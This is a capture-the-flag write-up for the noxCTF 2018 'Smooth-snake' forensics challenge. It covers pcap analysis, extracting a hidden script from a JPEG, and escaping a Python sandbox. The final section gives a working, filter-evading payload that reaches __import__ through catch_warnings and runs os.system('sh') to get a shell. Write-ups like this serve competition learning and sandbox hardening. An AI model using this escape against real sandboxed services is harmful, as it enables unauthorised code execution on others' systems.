# noxCTF 2018 : Smooth-snake

**category** : forensics

**points** : 804

**solves** : 21

## write-up

This challenges has many small challenges...

First we got a pcap

I use wireshark to open it and sort it by protocol

Look at the DNS request and HTTP request to know what they are doing

There are many unrelevant sites like youtube...

I find `flag.html` and it said `I Have The Flag, but only the snake know how to get it. Try to find the snake pic`

So I download `snake.jpg` from pcap

Use `binwalk` to check `snake.jpg` and find some base64 text at the end of jpg file

extract and decode the base64 text will get `file.py`

And guessing LEET = 1337 will get me a string `my server's port moved to p+y+t+h+o+n`

So I guess it means there is a server open at port `sum(map(ord, 'python')) == 674`

And the ip is the destination ip of the packet that get me `snake.jpg`

`nc 18.223.150.0 674` give me a python sandbox challenge...

```
._'\:
import
os
sys
open
eval
exec
compile
bytes
type
frozenset
vars
chr
locals
if
try
except
```

All of the above are forbidden words

Without `.` to call method, we can use `getattr` instead

Without `__import__`, we can use `catch_warnings` in `{}.__class__.__base__.__subclasses__()`

`{}.__class__.__base__.__subclasses__()[[i.__name__ == "catch_warnings" for i in {}.__class__.__base__.__subclasses__()].index(True)]` this will give me `catch_warnings`

`{}.__class__.__base__.__subclasses__()[[i.__name__ == "catch_warnings" for i in {}.__class__.__base__.__subclasses__()].index(True)]()._module.__builtins__["__import__"]("os").system("sh")` this will give me shell

Then we just need to change `.` to `getattr`, and `_` to `dir(0)[0][0]`

Final payload : `getattr(getattr(getattr(getattr(getattr(getattr((), dir(0)[0][0]*2+"class"+dir(0)[0][0]*2), dir(0)[0][0]*2+"base"+dir(0)[0][0]*2), dir(0)[0][0]*2+"subcl"+"asses"+dir(0)[0][0]*2)()[getattr([getattr(i, dir(0)[0][0]*2+"name"+dir(0)[0][0]*2) == "catch"+dir(0)[0][0]+"warnings" for i in getattr(getattr(getattr((), dir(0)[0][0]*2+"class"+dir(0)[0][0]*2), dir(0)[0][0]*2+"base"+dir(0)[0][0]*2), dir(0)[0][0]*2+"subcl"+"asses"+dir(0)[0][0]*2)()], "index")(True)](), dir(0)[0][0]+"module"), dir(0)[0][0]*2+"builtins"+dir(0)[0][0]*2)[dir(0)[0][0]*2+"imp"+"ort"+dir(0)[0][0]*2]("o"+"s"), "sy"+"stem")("sh")`

`noxCTF{v3n0m_pyc4p}`

# other write-ups and resources

